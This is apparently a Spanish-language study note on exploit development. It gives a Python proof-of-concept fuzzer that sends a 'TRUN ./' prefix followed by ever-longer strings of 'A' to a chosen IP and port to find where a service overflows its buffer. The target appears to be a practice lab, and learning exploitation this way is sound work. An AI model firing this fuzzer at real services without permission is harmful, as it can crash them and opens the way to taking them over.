tags: #programacion #script #python

---
Se comienza con el script POC (proof of concept) que se usara para demostrar que el programa es vulnerable a buffer overflow y ademas nos servira como fuzzer con el que encontrar el punto donde desborda el programa.

Instalar las librerías de pwn
```bash
sudo apt-get install python3-pwntools
```

Para comenzar un script en **Python** para explotar un buffer overflow y obtener el **POC** deberemos introducir la cabecera que especifica el tipo de script y las librerías que vamos a utilizar

```python
#!/usr.bin/python

import socket, sys
```

Con esto ya lo tenemos listo para comenzar a construir nuestro script POC

```python
#!/usr/bin/python3
from pwn import *
import socket, sys

if len(sys.argv) < 3:
    print ("\n [!] Uso: python " + sys.argv[0] + " <ip-adderss> <rport>\n")
    sys.exit(0)

#variables globales
ip_address = sys.argv[1]
rport = sys.argv[2]

if __name__ == '__main__':
    count = 200
    increment = 200
    buffer = "A"
    prefix = "TRUN ./"
    logger = log.progress('Data')
    try:
        while count < 10000000:
            logger.status("Enviamos %d" % count)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address,int(rport)))
            buffer = "A" * count            
            s.send(bytes(f"{prefix}{buffer}", 'utf-8'))         
            print(s.recv(1024))
            s.close()
            count += increment
    except socket.error as e:
        print (f"\n[!] Error al conectar con el servicio {e}\n")
        sys.exit(1)
    print("\n[+] Fin de programa\n")
    sys.exit(0)
```